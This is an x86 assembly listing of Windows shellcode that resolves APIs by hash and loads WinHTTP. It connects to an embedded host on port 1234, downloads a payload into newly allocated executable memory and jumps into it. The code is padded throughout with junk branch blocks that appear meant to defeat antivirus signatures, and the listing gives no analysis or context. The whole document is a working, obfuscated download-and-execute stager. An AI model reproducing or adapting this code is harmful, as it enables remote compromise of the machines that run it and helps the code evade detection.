```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    pushfd
    push eax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov edx, edx
real_1:
    pop eax
    popfd
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov ebp, esp
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    pushfd
    push eax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov edx, edx
real_2:
    pop eax
    popfd
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    xor edi, edi
L_1e:
    pushfd
    push eax
    xor eax, eax
    jnz bogus_3
    jmp real_3
bogus_3:
    nop
    mov edx, edx
real_3:
    pop eax
    popfd
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    push edi
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
    push eax
    mov ecx, dword ptr [eax + 0x18]
L_4b:
    pushfd
    push eax
    xor eax, eax
    jnz bogus_4
    jmp real_4
bogus_4:
    nop
    mov edx, edx
real_4:
    pop eax
    popfd
    test ecx, ecx
    je L_8b
    dec ecx
    xor edi, edi
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    xor eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    pushfd
    push eax
    xor eax, eax
    jnz bogus_5
    jmp real_5
bogus_5:
    nop
    mov edx, edx
real_5:
    pop eax
    popfd
    popal
    pop ecx
    pop edx
    push ecx
    pushfd
    push eax
    xor eax, eax
    jnz bogus_6
    jmp real_6
bogus_6:
    nop
    mov edx, edx
real_6:
    pop eax
    popfd
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x707474
    push 0x686e6977
    push esp
    push 0x726774c
    call ebp
    pushfd
    push eax
    xor eax, eax
    jnz bogus_7
    jmp real_7
bogus_7:
    nop
    mov edx, edx
real_7:
    pop eax
    popfd
    xor ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push 0xbb9d1f04
    call ebp
    pushfd
    push eax
    xor eax, eax
    jnz bogus_8
    jmp real_8
bogus_8:
    nop
    mov edx, edx
real_8:
    pop eax
    popfd
    push eax
    push ebx
    pushfd
    push eax
    xor eax, eax
    jnz bogus_9
    jmp real_9
bogus_9:
    nop
    mov edx, edx
real_9:
    pop eax
    popfd
    push 0x4d2
    call L_359
RET_c2:
L_27a:
    add edi, 0x2a
    push eax
    push 0xc21e9b46
    call ebp
    push DATA_0 + 62
    push ebx
    push ebx
    push ebx
    push edi
    push ebx
    push eax
    push 0x5bb31098
    call ebp
    xchg esi, eax
    sub esp, 0x10
    mov eax, esp
    push edi
    mov edi, eax
    push edi
    push 0x600ba721
    call ebp
    test eax, eax
    je L_2f9
    mov eax, dword ptr [edi + 4]
    test eax, eax
    je L_2dd
    pop edx
    sub edx, 0x2a
    push 1
    push ebx
    push ebx
    push eax
    push 3
    push 3
    mov eax, esp
    sub esp, 0xc
    mov edi, esp
    push edi
    push eax
    push edx
    lea eax, [esp + 0x40]
    push dword ptr [eax]
    push 0x49eaddda
    call ebp
    test eax, eax
    je L_2f9
    jmp L_2ec
L_2dd:
    mov eax, dword ptr [edi + 8]
    test eax, eax
    je L_2f9
    push 4
    pop eax
    add edi, eax
    dec eax
    mov dword ptr [edi], eax
L_2ec:
    push 0xc
    push edi
    push 0x26
    push esi
    push 0xce9d58d3
    call ebp
L_2f9:
    push 0xa
    pop edi
L_2fc:
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push esi
    push 0x91bb5895
    call ebp
    test eax, eax
    jne L_316
    dec edi
    jne L_2fc
L_311:
    call L_373
L_316:
    push ebx
    push esi
    push 0x709d8805
    call ebp
    test eax, eax
    je L_311
    push 0x40
    push 0x1000
    push 0x400000
    push ebx
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
    push ebx
    mov edi, esp
L_33c:
    push edi
    push 0x2000
    push ebx
    push esi
    push 0x7e24296c
    call ebp
    test eax, eax
    je L_311
    mov eax, dword ptr [edi]
    add ebx, eax
    test eax, eax
    jne L_33c
    pop eax
    ret
L_359:
    pop edi
    call L_27a
    xor dword ptr [eax], eax
    xor al, byte ptr [eax]
    aaa
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [eax], al
    add byte ptr [ebx + 0x56a2b5f0], bh
    push 0
    push ebx
    call ebp
```